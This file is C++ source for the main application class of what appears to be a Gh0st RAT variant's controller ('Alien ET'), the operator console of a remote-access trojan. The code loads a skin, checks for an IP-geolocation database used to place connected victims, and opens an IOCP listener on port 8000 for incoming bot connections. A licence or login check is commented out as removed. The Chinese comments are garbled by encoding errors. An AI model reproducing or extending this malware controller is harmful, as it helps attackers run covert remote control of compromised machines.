

#include "stdafx.h"
#include "Gh0st.h"

#include "MainFrm.h"
#include "Gh0stDoc.h"
#include "Gh0stView.h"
//#include "Login.h"
#include "SkinH.h"
#pragma comment(lib, "SkinH.lib")
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

// #include "LOGIN.h"
// LOGIN Login;
// CString strUser;
 
void CreateDumpFile(LPSTR lpstrDumpFilePathName, EXCEPTION_POINTERS *pException)
{
	// ����Dump�ļ�
	//
	HANDLE hDumpFile = CreateFile(lpstrDumpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Dump��Ϣ
	//
	MINIDUMP_EXCEPTION_INFORMATION dumpInfo;
	dumpInfo.ExceptionPointers = pException;
	dumpInfo.ThreadId = GetCurrentThreadId();
	dumpInfo.ClientPointers = TRUE;

	// д��Dump�ļ�����
	//
	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hDumpFile, MiniDumpNormal, &dumpInfo, NULL, NULL);

	CloseHandle(hDumpFile);
}

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{
	char buff[1024]={0};
	GetModuleFileName(NULL,buff,sizeof(buff));
	PathRemoveFileSpec(buff);
	lstrcat(buff,"\\����.dmp");
	CreateDumpFile(buff, ExceptionInfo);
	MessageBox(NULL, "������DMP�ļ����������Ŀ¼��DMP�ļ����͸��ͷ�", "Alien ET", MB_OK);
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{
	dbg_dump(ExceptionInfo);
	return true;
}
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp

BEGIN_MESSAGE_MAP(CGh0stApp, CWinApp)
	//{{AFX_MSG_MAP(CGh0stApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp construction
CGh0stApp::CGh0stApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	// ����ϵͳͼ��,������FilemanagerҪ�õ�
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);
	// ��ȡqqwry.dat��λ���ļ���
	char path[_MAX_PATH] = {}, *p=path;
	GetModuleFileName(NULL, path, sizeof(path));
	while (*p)p++;
	while (p != path && *p != '\\')p--;
	strcpy(p + 1, "QQwry.dat");
	HANDLE	hFile = CreateFile(path, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);
	// �Ƿ�Ҫ����������ʾ false�����������ݣ�
	/*
	�߼��� && 
	1 && 1=1
	1 && 0=0
	0 && 0=0
	
    �߼��� ||
    1 || 1=1
    0 || 1=1
    0 || 0=0
	*/
	m_bIsDisablePopTips = (m_IniFile.GetInt("Settings", "PopTips", false) && true);
	//
	m_bIsWarning_Tone   = (m_IniFile.GetInt("Settings", "Alarm", false) && true);
	m_bIsList_Draw      = (m_IniFile.GetInt("Settings", "LIST_DRAW",false ) && true);
    m_pConnectView = NULL;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CGh0stApp object

CGh0stApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp initialization
BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}
BOOL CGh0stApp::InitInstance()
{

	//***********��Ƥ��******************//
	HGLOBAL hRes;
	HRSRC hResInfo;
	HINSTANCE hinst = AfxGetInstanceHandle();
	hResInfo = FindResource( hinst, MAKEINTRESOURCE(IDR_SKIN), "SKIN" );
	if (hResInfo != NULL)
	{
		hRes = LoadResource( hinst, hResInfo);
		if (hRes != NULL)
		{
			SkinH_AttachRes( (LPBYTE)hRes, SizeofResource(hinst,hResInfo), NULL, NULL, NULL, NULL );
			SkinH_SetAero(FALSE);
			FreeResource(hRes);
		}
	}
	//*******************************************//


	SetUnhandledExceptionFilter(bad_exception);
	AfxEnableControlContainer();
 
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

/*
 	 	Login.DoModal();
	 	strUser = Login.m_username;
	 	if ( Login.dLogin <= 10000 )
	 	{
	 		return FALSE;
		}
	// ɾ����֤...........//
	CLogin dlg;
	dlg.DoModal();
	if (dlg.IsLogin==false)
	{
		exit(0);
	}*/
	// ɾ����֤...........����//

	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CGh0stDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CGh0stView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	// ����IOCP������
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");
	if (nPort == 0)	nPort = 8000;
	
	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nMaxConnection == 0) nMaxConnection = 8000;
	
	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
    CPictureEx	m_Picture;
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Control(pDX, IDC_GIFLAST, m_Picture);
	//}}AFX_DATA_MAP
	if (m_Picture.Load(MAKEINTRESOURCE(IDR_GIF1),_T("GIF")))   //��ʾGIFͼƬ
		m_Picture.Draw();
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGh0stApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp message handlers

